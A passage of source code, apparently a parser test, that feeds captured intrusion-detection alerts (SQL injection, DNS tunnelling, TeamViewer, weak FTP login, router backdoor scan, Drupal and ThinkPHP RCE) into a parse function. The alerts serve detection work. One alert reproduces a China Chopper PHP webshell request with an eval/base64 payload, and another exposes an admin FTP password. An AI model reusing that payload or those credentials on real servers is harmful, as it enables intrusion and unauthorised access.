statement for the purpose of attack. Developers should strictly check the type and format of input variables, filter and escape special characters.\",\"app_proto\":\"http\",\"target\":\"HTTP SQL injection attempt by AI Engine\",\"src_port\":\"54406\",\"engine_type\":\"ai\",\"src_ip_country_code\":\"CN\",\"attacker_country\":\"China\",\"dst_port\":\"8080\",\"src_ip_geoloc\":\"36.665261,116.994895\",\"src_ip_country\":\"China\",\"family\":\"\",\"category\":\"sql-injection\",\"resp_data\":\"\",\"ts\":\"1659318633.070\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-07-28T04:03:01.577Z 172.16.11.100 notice - - - {\"kill_chain\":\"actions-objectives\",\"dst_ip_geoloc\":\"36.665261,116.994895\",\"victim_geoloc\":\"36.6652610114,116.994895191\",\"hostip\":\"172.16.3.141\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"11000013\",\"uuid\":\"e3c8dff1-927c-44ce-88df-f1927c24ce3c\",\"number\":1,\"hostname\":\"ATD\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"RE5TIGNvdmVydCB0dW5uZWwgdHJhbnNtaXRzIHNlbnNpdGl2ZSBkYXRhIHRocm91Z2ggc3ViZG9tYWluIG5hbWVzOmFxYm9zd3h6Znljci5xc2JhbmsueXc=\",\"commid\":\"1:unweA8bfksSDuPM9vodYkUGQRlI=\",\"enrichments.dst_ip.in_range\":1,\"enrichments.victim.in_range\":1,\"attack_status\":\"attempt\",\"victim_city\":\"Jinan\",\"enrichments.dst_ip.host_type\":\"2\",\"dns\":{\"qtype_name\":\"A\",\"origin_answers\":\"\",\"domain\":\"qsbank.yw\",\"query\":\"aqboswxzfycr.qsbank.yw\",\"answers\":\"\",\"ttl\":\"\",\"rcode_name\":\"\"},\"dst_ip_country\":\"China\",\"victim_country_code\":\"CN\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"udp\",\"enrichments.src_ip.malicious\":\"2\",\"desc\":\"query:aqboswxzfycr.qsbank.yw;answers:;qtype_name:A;\",\"sub_category\":\"\",\"src_ip_city\":\"Jinan\",\"visit_direction_detail\":\"24\",\"reliability\":\"10\",\"classtype\":\"covert-channel\",\"interface\":\"em4\",\"dst_ip\":\"172.20.128.15\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"10.4.91.78\",\"dst_ip_city\":\"jinan\",\"victim\":\"10.4.91.78\",\"sensor_ip\":\"172.16.3.141\",\"visit_direction\":\"2\",\"timestamp\":\"1658980981575\",\"severity\":3,\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"enrichments.src_ip.in_range\":1,\"victim_country\":\"China\",\"message\":\"DNS tunnel is a technology that encapsulates the contents of other protocols in DNS protocol, and then transmits data (Communication) with DNS request and response packets\",\"app_proto\":\"dns\",\"target\":\"domain qsbank.yw with 1 subdomains in dns tunnel\",\"src_port\":\"53167\",\"engine_type\":\"ai\",\"src_ip_country_code\":\"CN\",\"dst_port\":\"53\",\"src_ip_geoloc\":\"36.6652610114,116.994895191\",\"src_ip_country\":\"China\",\"family\":\"\",\"category\":\"dns-tunneling\",\"resp_data\":\"\",\"ts\":\"1658980942.932\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-09-07T01:11:07.140Z 10.20.20.60 notice - - - {\"kill_chain\":\"attempt-attack\",\"dst_ip_geoloc\":\"34.7732,113.722\",\"victim_geoloc\":\"30.9448,117.8123\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"3003159\",\"mat_off\":[8],\"uuid\":\"8aa13589-32fc-4da4-a135-8932fc9da44c\",\"number\":1,\"hostname\":\"ATD\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"\",\"commid\":\"1:ottBR5f/93/Itndus+1G7yDCEw4=\",\"enrichments.victim.in_range\":1,\"attack_status\":\"attempt\",\"victim_city\":\"铜陵学院\",\"dns\":{\"qtype_name\":\"AAAA\",\"origin_answers\":\"\",\"query\":\"master12.teamviewer.com\",\"answers\":\"\"},\"dst_ip_country\":\"China\",\"victim_country_code\":\"CN\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"udp\",\"enrichments.src_ip.malicious\":\"2\",\"mat_fid\":[\"query\"],\"desc\":\"query:master12.teamviewer.com;answers:;qtype_name:AAAA;\",\"sub_category\":\"\",\"src_ip_city\":\"铜陵学院\",\"visit_direction_detail\":\"12\",\"reliability\":1,\"classtype\":\"weird-behavior\",\"interface\":\"p4p1\",\"dst_ip\":\"61.132.163.68\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"211.86.212.24\",\"dst_ip_city\":\"\",\"pcap_record\":\"/2022-09-07/09/11/07/980514986067133.pcap\",\"victim\":\"211.86.212.24\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"1\",\"timestamp\":\"1662513067140\",\"direction\":\"up\",\"severity\":2,\"mat_end\":[23],\"enrichments.src_ip.in_range\":1,\"victim_country\":\"China\",\"message\":\"Remote control tool TeamViewer is found in traffic\",\"app_proto\":\"dns\",\"target\":\"Remote control tool TeamViewer is found in traffic\",\"src_port\":\"39235\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CN\",\"dst_port\":\"53\",\"src_ip_geoloc\":\"30.9448,117.8123\",\"src_ip_country\":\"China\",\"category\":\"remote-control-tool-identify\",\"resp_data\":\"\",\"family\":\"\",\"attack_tool\":\"TeamViewer\",\"ts\":\"1662513067.131\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-09-07T01:01:25.005Z 10.20.20.60 notice - - - {\"attacker_city\":\"铜陵学院\",\"conn\":{\"duration\":\"65.610\",\"resp_bytes\":\"29686\",\"resp_pkts\":\"52\",\"orig_bytes\":\"3734\",\"conn_state\":\"\",\"orig_pkts\":\"84\"},\"kill_chain\":\"attempt-attack\",\"enrichments.attacker.in_range\":1,\"dst_ip_geoloc\":\"30.9448,117.8123\",\"victim_geoloc\":\"34.7732,113.722\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"source\":\"opensource\",\"rid\":\"10010004\",\"uuid\":\"cc93f8c4-035a-41ca-93f8-c4035af1ca61\",\"number\":1,\"hostname\":\"ATD\",\"payload\":\"\",\"commid\":\"1:MMSAiPFAVM5PCSTyOmPiRliMgrE=\",\"enrichments.dst_ip.in_range\":1,\"intel_type\":\"ip\",\"attack_status\":\"attempt\",\"victim_city\":\"\",\"enrichments.dst_ip.host_type\":\"2\",\"attacker_country_code\":\"CN\",\"dst_ip_country\":\"China\",\"tags\":\"others\",\"victim_country_code\":\"CN\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"1\",\"desc\":\"source:5;\\noriginal_reliability:9\",\"sub_category\":\"\",\"src_ip_city\":\"\",\"visit_direction_detail\":\"32\",\"reliability\":9,\"classtype\":\"threat-intelligence-alarm\",\"interface\":\"p4p1\",\"dst_ip\":\"211.86.208.41\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"180.163.220.3\",\"dst_ip_city\":\"铜陵学院\",\"pcap_record\":\"/2022-09-07/08/59/17/2005289845216096.pcap\",\"victim\":\"180.163.220.3\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"3\",\"timestamp\":\"1662512485000\",\"severity\":4,\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"attacker\":\"211.86.208.41\",\"victim_country\":\"China\",\"attacker_geoloc\":\"30.9448,117.8123\",\"message\":\"Malicious long session connection\",\"app_proto\":\"ssl\",\"target\":\"180.163.220.3\",\"src_port\":\"43109\",\"engine_type\":\"intel\",\"src_ip_country_code\":\"CN\",\"attacker_country\":\"China\",\"dst_port\":\"443\",\"src_ip_geoloc\":\"34.7732,113.722\",\"src_ip_country\":\"China\",\"family\":\"2022HW\",\"category\":\"long-time-malicious-connection\",\"resp_data\":\"\",\"ts\":\"1662512357021\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-09-07T00:57:57.126Z 10.20.20.60 notice - - - {\"kill_chain\":\"security-defect\",\"dst_ip_geoloc\":\"34.7732,113.722\",\"sub_category\":\"FTP协议弱口令登录\",\"hostip\":\"10.20.20.62\",\"src_ip_city\":\"铜陵学院\",\"visit_direction_detail\":\"12\",\"reliability\":8,\"classtype\":\"policy-violation\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"11000021\",\"interface\":\"p4p1\",\"uuid\":\"15647be6-a43e-4f41-a47b-e6a43e7f413e\",\"dst_ip\":\"222.195.31.250\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"10.20.21.4\",\"number\":1,\"hostname\":\"ATD\",\"dst_ip_city\":\"\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhYmNhZG1pbiJ9\",\"commid\":\"1:Idu2HWQwQ6THmh6JQSHoFsAA8nw=\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"1\",\"timestamp\":\"1662512277125\",\"severity\":4,\"attack_status\":\"success\",\"enrichments.src_ip.in_range\":1,\"dst_ip_country\":\"China\",\"message\":\"Weak password\",\"app_proto\":\"ftp\",\"target\":\"FTP协议弱口令登录(管理员账号)\",\"src_port\":\"59175\",\"engine_type\":\"bde\",\"src_ip_country_code\":\"CN\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"2\",\"dst_port\":\"21\",\"src_ip_geoloc\":\"30.9448,117.8123\",\"src_ip_country\":\"China\",\"family\":\"\",\"category\":\"weak-password\",\"resp_data\":\"\",\"user\":{\"password\":\"abcadmin\",\"username\":\"admin\"},\"ts\":\"1662512276.431\",\"desc\":\"\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-09-07T00:55:41.004Z 10.20.20.60 notice - - - {\"kill_chain\":\"attempt-attack\",\"dst_ip_geoloc\":\"30.9448,117.8123\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"3003158\",\"mat_off\":[5],\"uuid\":\"e3b5872b-6d79-4b5b-b587-2b6d795b5b29\",\"number\":1,\"hostname\":\"ATD\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"\",\"commid\":\"1:jsjfQs+PxHZfBfEQ0GPW+Y0x6XQ=\",\"enrichments.dst_ip.in_range\":1,\"attack_status\":\"attempt\",\"enrichments.dst_ip.host_type\":\"2\",\"dns\":{\"qtype_name\":\"A\",\"origin_answers\":\"\",\"query\":\"2.rlb.router.teamviewer.cn\",\"answers\":\"\"},\"dst_ip_country\":\"China\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"udp\",\"enrichments.src_ip.malicious\":\"2\",\"mat_fid\":[\"query\"],\"desc\":\"query:2.rlb.router.teamviewer.cn;answers:;qtype_name:A;\",\"sub_category\":\"\",\"src_ip_city\":\"铜陵学院\",\"visit_direction_detail\":\"24\",\"reliability\":1,\"classtype\":\"weird-behavior\",\"interface\":\"p4p1\",\"dst_ip\":\"211.86.208.1\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"211.86.209.30\",\"dst_ip_city\":\"铜陵学院\",\"pcap_record\":\"/2022-09-07/08/55/40/1072629092724575.pcap\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"2\",\"timestamp\":\"1662512141003\",\"direction\":\"up\",\"severity\":2,\"mat_end\":[26],\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"enrichments.src_ip.in_range\":1,\"message\":\"Remote control tool TeamViewer is found in traffic\",\"app_proto\":\"dns\",\"target\":\"Remote control tool TeamViewer is found in traffic\",\"src_port\":\"56923\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CN\",\"dst_port\":\"53\",\"src_ip_geoloc\":\"30.9448,117.8123\",\"src_ip_country\":\"China\",\"category\":\"remote-control-tool-identify\",\"resp_data\":\"\",\"family\":\"\",\"attack_tool\":\"TeamViewer\",\"ts\":\"1662512140.995\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-09-07T00:53:18.021Z 10.20.20.60 notice - - - {\"attacker_city\":\"Toronto\",\"kill_chain\":\"scan-detect\",\"dst_ip_geoloc\":\"30.9448,117.8123\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"4012860\",\"mat_off\":[8],\"uuid\":\"c1e244d2-7f93-4677-a244-d27f93a677a3\",\"number\":1,\"hostname\":\"ATD\",\"payload\":\"W3sic2VnX21hdGNoIjpbeyJwcyI6NTgsInBlIjo2NX1dLCJzZWdfZGF0YSI6IkFBMUliWDNDeEFtM01BTVdnUUFnQ0lFQUFBTUlBRVVvQUMzVU1RQUE1Ukg5bmFxN3RVSFRWdEIwc1Z6UXBRQVpBQUJCUVVGQlFVRkJRVzVsZEdOdmNtVUFDZz09In1d\",\"commid\":\"1:m0Gm610XwbqHDhYz6bs3PeXrHTM=\",\"enrichments.dst_ip.in_range\":1,\"attack_status\":\"attempt\",\"enrichments.dst_ip.host_type\":\"2\",\"attacker_country_code\":\"CA\",\"dst_ip_country\":\"China\",\"proto\":\"udp\",\"enrichments.src_ip.malicious\":\"2\",\"mat_fid\":[\"payload\"],\"desc\":\"\",\"sub_category\":\"\",\"src_ip_city\":\"Toronto\",\"visit_direction_detail\":\"32\",\"reliability\":7,\"classtype\":\"scan\",\"interface\":\"p4p1\",\"dst_ip\":\"211.86.208.116\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"170.187.181.65\",\"dst_ip_city\":\"铜陵学院\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"3\",\"timestamp\":\"1662511998019\",\"direction\":\"up\",\"severity\":4,\"mat_end\":[15],\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"attacker\":\"170.187.181.65\",\"attacker_geoloc\":\"43.6547,-79.3623\",\"message\":\"netcore routers vulnerability , use hard coded password:netcore\",\"app_proto\":\"other\",\"target\":\"netcore routers vulnerability , use hard coded password:netcore\",\"src_port\":\"45404\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CA\",\"attacker_country\":\"Canada\",\"dst_port\":\"53413\",\"src_ip_geoloc\":\"43.6547,-79.3623\",\"src_ip_country\":\"Canada\",\"category\":\"scan\",\"resp_data\":\"\",\"family\":\"\",\"ts\":\"1662511997.991\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-08-23T18:53:42.043Z 10.20.20.60 notice - - - {\"kill_chain\":\"security-defect\",\"dst_ip_geoloc\":\"30.9448,117.8123\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"4012963\",\"mat_off\":[0,11],\"uuid\":\"0297e168-6f99-4afa-97e1-686f998afa0c\",\"number\":1,\"hostname\":\"ATD\",\"payload\":\"W3sic2VnX21hdGNoIjpbeyJwcyI6NzQsInBlIjo3N30seyJwcyI6ODUsInBlIjo5MH1dLCJzZWdfZGF0YSI6IkFGQldqNXlGeEFtM01BTVdnUUFnQklFQUFHY0lBRVVBQUVRSEpVQUFLUWI3Q25zR01TVFRWdEFEV0JjQnU0U0w4SGcyVHk1eWdCZ0I5cWxlQUFBQkFRZ0tHejAvOXplT0FzTUFEamczcFNZSW9odWdzUUFBQUFBQSJ9XQ==\",\"commid\":\"1:pE5fhe8XOIdX1DInibB1eMEq2OQ=\",\"enrichments.dst_ip.in_range\":1,\"attack_status\":\"attempt\",\"enrichments.dst_ip.host_type\":\"2\",\"dst_ip_country\":\"China\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"1\",\"mat_fid\":[\"payload\",\"payload\"],\"desc\":\"\",\"sub_category\":\"\",\"src_ip_city\":\"\",\"visit_direction_detail\":\"32\",\"reliability\":1,\"classtype\":\"encrypted-proxy\",\"interface\":\"p4p1\",\"dst_ip\":\"211.86.208.3\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"123.6.49.36\",\"dst_ip_city\":\"铜陵学院\",\"pcap_record\":\"/2022-08-24/02/53/42/1989519619737115.pcap\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"3\",\"timestamp\":\"1661280822043\",\"direction\":\"up\",\"severity\":2,\"mat_end\":[3,16],\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"message\":\"OpenVPN Initialize connection,client to server with tcp,opcode-7\",\"app_proto\":\"other\",\"target\":\"OpenVPN Initialize connection,client to server with tcp,opcode-7\",\"src_port\":\"22551\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CN\",\"dst_port\":\"443\",\"src_ip_geoloc\":\"34.7732,113.722\",\"src_ip_country\":\"China\",\"category\":\"vpn-flow-identify\",\"resp_data\":\"\",\"family\":\"\",\"attack_tool\":\"OpenVpn\",\"ts\":\"1661280822.006\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "2021-06-11T03: 24: 00.446Z 172.16.1.247 notice {\"attacker_city\": \"北京市\",\"kill_chain\": \"remote-control\",\"enrichments.attacker.in_range\": 1,\"dst_ip_geoloc\": \"39.9047,116.4072\",\"victim_geoloc\": \"39.9047,116.4072\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"CN\",\"event_source\": \"NDE\",\"rid\": \"3002002\",\"uuid\": \"06ae7321-c994-4dfd-ae73-21c9941dfdf7\",\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDE2IE9jdCAyMDE3IDA5OjE0OjIyIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjQgKFdpbjMyKSBQSFAvNS4yLjQNClgtUG93ZXJlZC1CeTogUEhQLzUuMi40DQpDb250ZW50LUxlbmd0aDogMjk5DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWwNCg0KLT58Li8uMjAxNy0xMC0xNiAwOToxNDoyMi4wLjA3NzcKamlhb2RhLy4yMDE0LTAxLTE2IDE2OjA1OjQyLjAuMDc3NwouLi4xOTcwLTAxLTAxIDAwOjAwOjAwLi4KMS5waHAuMjAxNy0xMC0xNiAwOTowNzo1Mi4yNy4wNjY2CmNvb2sudHh0LjIwMTctMTAtMTYgMDg6NTk6MzIuMzAyLjA2NjYKY29va2llcy5waHAuMjAxNy0xMC0xNiAwODo1MTo0OS4zMDEuMDY2NgpwaHBpbmZvLnBocC4yMDA4LTA5LTAzIDA3OjM0OjA2LjI3OC4wNjY2ClJlbW92ZUZyb21TaGVsbC5yZWcuMjAxNy0xMC0xNiAwOToxNDoyMi4xMTIuMDY2Ngp8PC0=\",\"commid\": \"1:fo4Q/TYU9keUXf6ki0z+veeYZRY=\",\"enrichments.dst_ip.in_range\": 1,\"enrichments.victim.in_range\": 1,\"victim_city\": \"北京市\",\"enrichments.dst_ip.host_type\": \"2\",\"attacker_country_code\": \"CN\",\"dst_ip_country\": \"China\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"http\": {\"status_code\": 200,\"method\": \"POST\",\"server_header_names\": \"Date: Mon, 16 Oct 2017 09:14:22 GMT\\r\\nServer: Apache/2.2.4 (Win32) PHP/5.2.4\\r\\nX-Powered-By: PHP/5.2.4\\r\\nContent-Length: 299\\r\\nConnection: close\\r\\nContent-Type: text/html\\r\\n\\r\\n\",\"uri\": \"/1.php\",\"version\": \"HTTP/1.1\",\"referrer\": \"http://192.168.12.192\",\"client_header_names\": \"Cache-Control: no-cache\\r\\nX-Forwarded-For: 53.120.54.227\\r\\nReferer: http://192.168.12.192\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\nHost: 192.168.12.192\\r\\nContent-Length: 752\\r\\nConnection: Close\\r\\n\\r\\n\",\"content_type\": \"application/x-www-form-urlencoded\",\"request_body\": \"c=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=QzpcXERlZGVBTVBaXFxXZWJSb290XFxEZWZhdWx0XFw%3D\", \"resp_body\": \"->|./\\t2017-10-16 09:14:22\\t0\\t0777\\njiaoda/\\t2014-01-16 16:05:42\\t0\\t0777\\n..\\t1970-01-01 00:00:00\\t\\t\\n1.php\\t2017-10-16 09:07:52\\t27\\t0666\\ncook.txt\\t2017-10-16 08:59:32\\t302\\t0666\\ncookies.php\\t2017-10-16 08:51:49\\t301\\t0666\\nphpinfo.php\\t2008-09-03 07:34:06\\t278\\t0666\\nRemoveFromShell.reg\\t2017-10-16 09:14:22\\t112\\t0666\\n|<-\",\"host\": \"192.168.12.192\",\"xff\": \"53.120.54.227\",\"status_msg\": \"OK\",\"user_agent\": \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\",\"content_length\": 752},\"victim_port\": \"80\",\"desc\": \"method:POST;host:192.168.12.192;status_code:200;uri:/1.php;\",\"sub_category\": \"\",\"src_ip_city\": \"北京市\",\"visit_direction_detail\": \"24\",\"reliability\": 10,\"classtype\": \"web-attack\",\"increment\": 0,\"interface\": \"pcap;china_webshell.8af981e451e44563be3cdc1c122add1e.pcap\",\"dst_ip\": \"192.168.12.192\",\"enrichments.dst_ip.malicious\": \"2\",\"src_ip\": \"192.168.12.195\",\"mal_source\": \"192.168.12.192\",\"dst_ip_city\": \"北京市\",\"victim\": \"192.168.12.192\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"2\",\"timestamp\": \"1623381832780\",\"direction\": \"down\",\"severity\": 5,\"enrichments.dst_ip.host_group\": \"Default Terminal Group\",\"enrichments.src_ip.in_range\": 1,\"attacker\": \"192.168.12.195\",\"victim_country\": \"China\",\"attacker_geoloc\": \"39.9047,116.4072\",\"message\": \"Chopper 2011/2014 php webshell connection,vulnerability Was Successfully Exploited\",\"app_proto\": \"http\",\"target\": \"Chopper 2011/2014 php webshell connection,vulnerability Was Successfully Exploited\",\"src_port\": \"1559\",\"attacker_port\": \"1559\",\"engine_type\": \"sde\",\"src_ip_country_code\": \"CN\",\"attacker_country\": \"China\",\"dst_port\": \"80\",\"src_ip_geoloc\": \"39.9047,116.4072\",\"src_ip_country\": \"China\",\"category\": \"webshell\",\"resp_data\": \"\",\"family\": \"\",\"ts\": \"1508145262.880\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-08-23T18:53:42.043Z 10.20.20.60 notice - - - {\"kill_chain\":\"security-defect\",\"dst_ip_geoloc\":\"30.9448,117.8123\",\"hostip\":\"10.20.20.62\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"4012963\",\"mat_off\":[0,11],\"uuid\":\"0297e168-6f99-4afa-97e1-686f998afa0c\",\"number\":1,\"hostname\":\"ATD\",\"payload\":\"W3sic2VnX21hdGNoIjpbeyJwcyI6NzQsInBlIjo3N30seyJwcyI6ODUsInBlIjo5MH1dLCJzZWdfZGF0YSI6IkFGQldqNXlGeEFtM01BTVdnUUFnQklFQUFHY0lBRVVBQUVRSEpVQUFLUWI3Q25zR01TVFRWdEFEV0JjQnU0U0w4SGcyVHk1eWdCZ0I5cWxlQUFBQkFRZ0tHejAvOXplT0FzTUFEamczcFNZSW9odWdzUUFBQUFBQSJ9XQ==\",\"commid\":\"1:pE5fhe8XOIdX1DInibB1eMEq2OQ=\",\"enrichments.dst_ip.in_range\":1,\"attack_status\":\"attempt\",\"enrichments.dst_ip.host_type\":\"2\",\"dst_ip_country\":\"China\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"1\",\"mat_fid\":[\"payload\",\"payload\"],\"desc\":\"\",\"sub_category\":\"\",\"src_ip_city\":\"\",\"visit_direction_detail\":\"32\",\"reliability\":1,\"classtype\":\"encrypted-proxy\",\"interface\":\"p4p1\",\"dst_ip\":\"211.86.208.3\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"123.6.49.36\",\"dst_ip_city\":\"铜陵学院\",\"pcap_record\":\"/2022-08-24/02/53/42/1989519619737115.pcap\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"3\",\"timestamp\":\"1661280822043\",\"direction\":\"up\",\"severity\":2,\"mat_end\":[3,16],\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"message\":\"OpenVPN Initialize connection,client to server with tcp,opcode-7\",\"app_proto\":\"other\",\"target\":\"OpenVPN Initialize connection,client to server with tcp,opcode-7\",\"src_port\":\"22551\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CN\",\"dst_port\":\"443\",\"src_ip_geoloc\":\"34.7732,113.722\",\"src_ip_country\":\"China\",\"category\":\"vpn-flow-identify\",\"resp_data\":\"\",\"family\":\"\",\"attack_tool\":\"OpenVpn\",\"ts\":\"1661280822.006\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-08-19T05:13:14.425Z 10.20.20.60 notice - - - {\"kill_chain\":\"malware-download\",\"dst_ip_geoloc\":\"30.9448,117.8123\",\"victim_geoloc\":\"22.2578,114.1657\",\"sub_category\":\"remote-code-execution,cve-exploit,backdoor\",\"hostip\":\"10.20.20.62\",\"src_ip_city\":\"Hong Kong\",\"reliability\":8,\"classtype\":\"compromised-host\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"20270001\",\"interface\":\"\",\"uuid\":\"2f82acce-17eb-4b4b-82ac-ce17ebdb4b13\",\"dst_ip\":\"0.0.0.0\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"148.66.50.90\",\"number\":1,\"hostname\":\"ATD\",\"dst_ip_city\":\"铜陵市\",\"payload\":\"YXR0YWNrIGZhbWlsaWVzW051bTo0XTogcmVtb3RlLWNvZGUtZXhlY3V0aW9uKHNpZDozMDAwNDMzLDMwMDA0MzIsMzAwMDQzMyksIGJhY2tkb29yKHNpZDozMDAwMjA5KSwgQ1ZFLTIwMTgtNzYwMihzaWQ6MzgwMDExMiwzODAwMTEyKSwgQ1ZFLTIwMTgtNzYwMChzaWQ6MjAyNTUzNCkuCnRocmVhdF9jYXRlZ29yaWVzW051bTozXTogcmVtb3RlLWNvZGUtZXhlY3V0aW9uLCBjdmUtZXhwbG9pdCwgYmFja2Rvb3IuCmF0dGFjayBtZXNzYWdlIE51bTo1\",\"commid\":\"1:Dg8j4h5cLNeCBEAzmeXuFXeGJZo=\",\"victim\":\"148.66.50.90\",\"sensor_ip\":\"10.20.20.62\",\"visit_direction\":\"4\",\"timestamp\":\"1660885994424\",\"severity\":4,\"attack_status\":\"attempt\",\"victim_city\":\"Hong Kong\",\"victim_country\":\"China\",\"dst_ip_country\":\"China\",\"message\":\"Compromised host found by signature correlation analysis\",\"app_proto\":\"other\",\"target\":\"ATTACK [PTsecurity] Drupalgeddon2 <7.5.9 <8.4.8 <8.5.3 RCE (CVE-2018-7602),Thinkphp 5.0.* Thinkphp 5.1.* Remote command execution POST,Thinkphp 5.0.* Thinkphp 5.1.* RCE,WEB_SPECIFIC_APPS Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE Through Registration Form (CVE-2018-7600),phpstudy backdoor remote command excution detected\",\"src_port\":\"0\",\"victim_country_code\":\"CN\",\"engine_type\":\"correlation\",\"src_ip_country_code\":\"CN\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"2\",\"dst_port\":\"0\",\"src_ip_geoloc\":\"22.2578,114.1657\",\"src_ip_country\":\"China\",\"family\":\"\",\"category\":\"ids-compromised-host\",\"resp_data\":\"\",\"ts\":\"\",\"desc\":\"\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
